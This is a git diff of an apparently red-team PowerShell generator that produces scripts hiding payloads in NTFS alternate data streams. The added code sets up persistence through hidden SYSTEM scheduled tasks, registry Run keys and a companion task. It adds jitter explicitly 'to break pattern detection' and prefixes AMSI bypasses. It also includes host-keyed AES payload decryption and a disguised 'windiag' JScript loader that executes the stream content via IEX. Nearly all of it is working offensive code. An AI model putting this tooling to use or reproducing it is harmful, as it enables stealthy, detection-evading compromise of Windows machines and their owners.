@@ -63,7 +63,7 @@
 
 .NOTES
     Author: Qweary
-    Version: 2.2.4 (Command Generator - JScript Unicode ADS Path Fix)
+    Version: 2.3 (Trigger + Registry Persistence + Jitter)
     Requires: ADS-Dropper.ps1 in ./src/ or same directory
 #>
 
@@ -82,6 +82,17 @@ param(
     
     [ValidateSet('task', 'registry', 'wmi', 'none')]
     [string]$Persist = 'task',
+
+    [ValidateSet('AtLogOn', 'AtStartup', 'OnIdle', 'OnUnlock')]
+    [string[]]$Trigger = @('AtLogOn', 'AtStartup'),
+
+    # Periodic execution interval in minutes (always added to tasks)
+    [ValidateRange(1, 1440)]
+    [int]$PeriodicMinutes = 5,
+
+    # Jitter as percentage of interval — randomizes timing to break pattern detection
+    [ValidateRange(0, 50)]
+    [int]$JitterPercent = 20,
     
     [ValidateRange(0, 10)]
     [int]$CreateDecoys = 0,
@@ -106,7 +117,7 @@ param(
 )
 
 Write-Host "`n╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║ ADS Minimal Command Generator v2.2.4                  ║" -ForegroundColor Cyan
+Write-Host "║ ADS Minimal Command Generator v2.3                  ║" -ForegroundColor Cyan
 Write-Host "╚═══════════════════════════════════════════════════════════╝`n" -ForegroundColor Cyan
 
 # ============================================================
@@ -328,6 +339,9 @@ $params = @{
     ZeroWidthStreams = $ZeroWidthStreams
     ZeroWidthMode = $ZeroWidthMode
     Persist = $Persist
+    Trigger = $Trigger
+    PeriodicMinutes = $PeriodicMinutes
+    JitterPercent = $JitterPercent
     Randomize = $Randomize
     Encrypt = $Encrypt
     CreateDecoys = $CreateDecoys
@@ -349,6 +363,8 @@ Write-Host "[+] Configuration computed" -ForegroundColor Green
 Write-Host "    Host: $($config.HostPath)" -ForegroundColor Gray
 Write-Host "    Stream: $($config.StreamNameEscaped)" -ForegroundColor Gray
 Write-Host "    Task: $($config.TaskName)" -ForegroundColor Gray
+Write-Host "    Trigger: $($config.Trigger -join '+')" -ForegroundColor Gray
+Write-Host "    Periodic: every $($config.PeriodicMinutes)m / Jitter: $($config.JitterPercent)%" -ForegroundColor Gray
 if ($InstanceCount -gt 1) {
     Write-Host "    Instances: $InstanceCount (each gets unique path/stream/task)" -ForegroundColor Yellow
 }
@@ -537,6 +553,63 @@ function Build-DeepPlacementCode {
     return $code
 }
 
+# Helper function: build the trigger + settings block for the generated script
+# Shared by task persistence and registry companion task
+function Build-TriggerBlock {
+
+    $jitterMinutes = if ($JitterPercent -gt 0) {
+        [Math]::Max(1, [Math]::Round($PeriodicMinutes * $JitterPercent / 100))
+    } else { 0 }
+
+    $code = "`$_triggers=@()`n"
+
+    # Event-based triggers
+    foreach ($t in $Trigger) {
+        switch ($t) {
+            'AtLogOn' {
+                $code += "`$_t=New-ScheduledTaskTrigger -AtLogOn`n"
+                if ($jitterMinutes -gt 0) {
+                    $code += "`$_t.RandomDelay=(New-TimeSpan -Minutes $jitterMinutes)`n"
+                }
+                $code += "`$_triggers+=`$_t`n"
+            }
+            'AtStartup' {
+                $code += "`$_t=New-ScheduledTaskTrigger -AtStartup`n"
+                if ($jitterMinutes -gt 0) {
+                    $code += "`$_t.RandomDelay=(New-TimeSpan -Minutes $jitterMinutes)`n"
+                }
+                $code += "`$_triggers+=`$_t`n"
+            }
+            'OnIdle' {
+                $code += "`$_triggers+=New-CimInstance -CimClass (Get-CimClass MSFT_TaskIdleTrigger -Namespace Root/Microsoft/Windows/TaskScheduler) -ClientOnly`n"
+            }
+            'OnUnlock' {
+                $code += "`$_tU=New-CimInstance -CimClass (Get-CimClass MSFT_TaskSessionStateChangeTrigger -Namespace Root/Microsoft/Windows/TaskScheduler) -Property @{StateChange=[uint32]8} -ClientOnly # 8=SessionUnlock`n"
+                if ($jitterMinutes -gt 0) {
+                    $code += "`$_tU.RandomDelay='PT${jitterMinutes}M'`n"
+                }
+                $code += "`$_triggers+=`$_tU`n"
+            }
+        }
+    }
+
+    # Periodic trigger (always)
+    $code += "`$_tP=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes $PeriodicMinutes) -RepetitionDuration (New-TimeSpan -Days 9999)`n"
+    if ($jitterMinutes -gt 0) {
+        $code += "`$_tP.RandomDelay=(New-TimeSpan -Minutes $jitterMinutes)`n"
+    }
+    $code += "`$_triggers+=`$_tP`n"
+
+    # Settings
+    if ($Trigger -contains 'OnIdle') {
+        $code += "`$_stg=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -IdleDuration (New-TimeSpan -Minutes 10) -IdleWaitTimeout (New-TimeSpan -Hours 1)`n"
+    } else {
+        $code += "`$_stg=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden`n"
+    }
+
+    return $code
+}
+
 # Helper function: build ADS write + persistence for the generated script
 function Build-DeployBlock {
     $block = @"
@@ -607,12 +680,9 @@ shell.Run(cmd, 0, false);
 `$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
 `$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
 `$a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript ```"`$_jsPath```""
-`$t1=New-ScheduledTaskTrigger -AtStartup
-`$t2=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
-`$t=@(`$t1,`$t2)
-`$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
+$(Build-TriggerBlock)
 `$p=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Principal `$p -Force|Out-Null
+Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$_triggers -Settings `$_stg -Principal `$p -Force|Out-Null
 
 "@
         } else {
@@ -646,27 +716,129 @@ shell.Run(cmd, 0, false);
 `$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
 `$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
 `$a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript ```"`$_jsPath```""
-`$t1=New-ScheduledTaskTrigger -AtStartup
-`$t2=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
-`$t=@(`$t1,`$t2)
-`$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
+$(Build-TriggerBlock)
 `$p=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Principal `$p -Force|Out-Null
+Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$_triggers -Settings `$_stg -Principal `$p -Force|Out-Null
 
 "@
         }
     } elseif ($Persist -eq 'registry') {
-        # Registry persistence
+        # Registry persistence — Run keys for logon/startup + companion task for periodic/cheeky triggers
+
+        # Build the registry value command
+        if ($Encrypt) {
+            $regPayloadCmd = 'function GHK{$h=@($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))};function Dec($d,$k){$b=[Convert]::FromBase64String($d);$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$b[0..15];$c=$a.CreateDecryptor();$t=$b[16..($b.Length-1)];$p=$c.TransformFinalBlock($t,0,$t.Length);[Text.Encoding]::UTF8.GetString($p)};$k=GHK;$e=gc ' + "'" + '$hp' + ':' + '$sn' + "'" + ' -Raw;IEX(Dec $e $k)'
+        } else {
+            $regPayloadCmd = 'IEX(gc ' + "'" + '$hp' + ':' + '$sn' + "'" + ' -Raw)'
+        }
+
+        # AMSI bypass prefix
+        $regAmsiPrefix = ""
         if (-not $NoAmsi) {
             $regBypass = New-AmsiBypassForRegistry
             $regBypassSafe = $regBypass -replace "'","''"
-            $block += "`$_regByp='" + $regBypassSafe + "'`n"
-            $block += "`$_regCmd='powershell.exe -NoP -W Hidden -C `"' + `$_regByp + 'IEX(gc ' + [char]39 + `$hp + ':' + `$sn + [char]39 + ' -Raw)`"'`n"
-            $block += "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value `$_regCmd`n`n"
-        } else {
-            $block += "`$_regCmd='powershell.exe -NoP -W Hidden -C `"IEX(gc ' + [char]39 + `$hp + ':' + `$sn + [char]39 + ' -Raw)`"'`n"
-            $block += "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value `$_regCmd`n`n"
+            $regAmsiPrefix = "`$_regByp='" + $regBypassSafe + "'`n"
         }
+
+        $block += $regAmsiPrefix
+
+        # Build and set the registry value command
+        if (-not $NoAmsi) {
+            $block += "`$_regCmd='powershell.exe -NoP -W Hidden -EP Bypass -C `"'+`$_regByp+'$regPayloadCmd`"'`n"
+        } else {
+            $block += "`$_regCmd='powershell.exe -NoP -W Hidden -EP Bypass -C `"$regPayloadCmd`"'`n"
+        }
+
+        # Write registry Run keys based on triggers
+        if ($Trigger -contains 'AtLogOn') {
+            $block += "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value `$_regCmd`n"
+        }
+        if ($Trigger -contains 'AtStartup') {
+            $block += @"
+`$_isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if(`$_isAdmin){Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value `$_regCmd}else{$(if ($Trigger -notcontains 'AtLogOn') { "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value `$_regCmd" })}
+
+"@
+        }
+        # If neither AtLogOn nor AtStartup, still write HKCU as baseline
+        if ($Trigger -notcontains 'AtLogOn' -and $Trigger -notcontains 'AtStartup') {
+            $block += "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value `$_regCmd`n"
+        }
+        $block += "`n"
+
+        # Companion task — handles periodic + cheeky triggers (OnIdle, OnUnlock)
+        # Build AMSI bypass for Layer B (JScript wrapper)
+        $jsAmsiLineCompanion = ""
+        if (-not $NoAmsi) {
+            $layerBCompanion = New-AmsiBypassLayerB
+            $jsAmsiLineCompanion = @"
+    "$layerBCompanion" +
+
+"@
+        }
+
+        if ($Encrypt) {
+            $block += @"
+# Companion task: JScript wrapper for periodic + cheeky triggers
+`$adsPath=`$hp+':'+`$sn
+`$_snEsc=(`$sn.ToCharArray()|%{'[char]0x{0:X4}'-f[int]`$_}) -join '+'
+`$_hpEsc=`$hp-replace'\\','\\\\'
+`$_jsBody=@'
+var shell = new ActiveXObject("WScript.Shell");
+var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
+    "function Get-HostKey{" +
+        "`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;" +
+        "[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))" +
+    "};" +
+    "function Dec(`$d,`$k){" +
+        "`$b=[Convert]::FromBase64String(`$d);" +
+        "`$a=[Security.Cryptography.Aes]::Create();" +
+        "`$a.Key=`$k;`$a.IV=`$b[0..15];" +
+        "`$c=`$a.CreateDecryptor();" +
+        "`$t=`$b[16..(`$b.Length-1)];" +
+        "`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);" +
+        "[Text.Encoding]::UTF8.GetString(`$p)" +
+    "};" +
+    "`$k=Get-HostKey;" +
+    "`$_sn=__SNEXPR__;" +
+    "`$e=Get-Content ('__HOSTPATH__:'+`$_sn) -Raw;" +
+$jsAmsiLineCompanion    "`$p=Dec `$e `$k;" +
+    "IEX `$p" +
+    "\"";
+shell.Run(cmd, 0, false);
+'@
+`$_jsBody=`$_jsBody.Replace('__SNEXPR__',`$_snEsc).Replace('__HOSTPATH__',`$_hpEsc)
+
+"@
+        } else {
+            $block += @"
+# Companion task: JScript wrapper for periodic + cheeky triggers
+`$adsPath=`$hp+':'+`$sn
+`$_snEsc=(`$sn.ToCharArray()|%{'[char]0x{0:X4}'-f[int]`$_}) -join '+'
+`$_hpEsc=`$hp-replace'\\','\\\\'
+`$_jsBody=@'
+var shell = new ActiveXObject("WScript.Shell");
+var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
+$jsAmsiLineCompanion    "`$_sn=__SNEXPR__;IEX(Get-Content ('__HOSTPATH__:'+`$_sn) -Raw)" +
+    "\"";
+shell.Run(cmd, 0, false);
+'@
+`$_jsBody=`$_jsBody.Replace('__SNEXPR__',`$_snEsc).Replace('__HOSTPATH__',`$_hpEsc)
+
+"@
+        }
+
+        $block += @"
+`$_jsDir=Split-Path `$hp -Parent;if(-not `$_jsDir){`$_jsDir=`$env:ProgramData}
+`$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
+`$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
+`$a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript ```"`$_jsPath```""
+$(Build-TriggerBlock)
+`$p=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+`$_ctn=`$tn+'_Companion'
+Register-ScheduledTask -TaskName `$_ctn -Action `$a -Trigger `$_triggers -Settings `$_stg -Principal `$p -Force -EA SilentlyContinue|Out-Null
+
+"@
     }
 
     return $block
@@ -763,6 +935,9 @@ if (-not $PayloadAtDeployment) {
         StreamNameEscaped = $config.StreamNameEscaped
         Codepoints        = $config.Codepoints
         TaskName          = $config.TaskName
+        Trigger           = $Trigger -join '+'
+        PeriodicMinutes   = $PeriodicMinutes
+        JitterPercent     = $JitterPercent
         ZeroWidthMode     = $ZeroWidthMode
         Persistence       = $Persist
         Encrypted         = $Encrypt.IsPresent
@@ -779,6 +954,8 @@ if (-not $PayloadAtDeployment) {
         GeneratedOn       = hostname
         OutputFile        = $OutputFile
         JScriptLoaderNote = "Created at runtime: <host_dir>\windiag_<random>.js"
+        RegistryPath      = if ($Persist -eq 'registry') { "HKCU" + $(if ($Trigger -contains 'AtStartup') { " + HKLM (if admin)" }) + ":\...\Run" } else { $null }
+        CompanionTaskNote = if ($Persist -eq 'registry') { "Companion task: <TaskName>_Companion (periodic+cheeky triggers)" } else { $null }
     }
     
     $manifest | ConvertTo-Json -Depth 10 | Out-File -FilePath $manifestFile -Encoding UTF8 -Force
@@ -800,6 +977,7 @@ CONFIGURATION:
   Task Name: $($config.TaskName)
   Zero-Width Mode: $ZeroWidthMode
   Persistence: $Persist
+  Trigger: $($Trigger -join '+') + Periodic(${PeriodicMinutes}m) + Jitter(${JitterPercent}%)
   Decoys: $CreateDecoys
   Encryption: $($Encrypt.IsPresent)
   Randomized: $($Randomize.IsPresent)
@@ -844,8 +1022,20 @@ $(if ($PayloadAtDeployment) { "4. Enter payload when prompted`n5. Press Enter tw
 # Remove ADS
 Remove-Item "`$(`$hp)``:`$sn" -Force
 
+$(if ($Persist -eq 'task') {
+@"
 # Remove task
 Unregister-ScheduledTask -TaskName '$($config.TaskName)' -Confirm:`$false
+"@
+} elseif ($Persist -eq 'registry') {
+@"
+# Remove registry persistence
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name '$($config.TaskName)' -EA 0
+Remove-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name '$($config.TaskName)' -EA 0
+# Remove companion task
+Unregister-ScheduledTask -TaskName '$($config.TaskName)_Companion' -Confirm:`$false -EA 0
+"@
+})
 
 # Remove host file
 Remove-Item '$($config.HostPath)' -Force
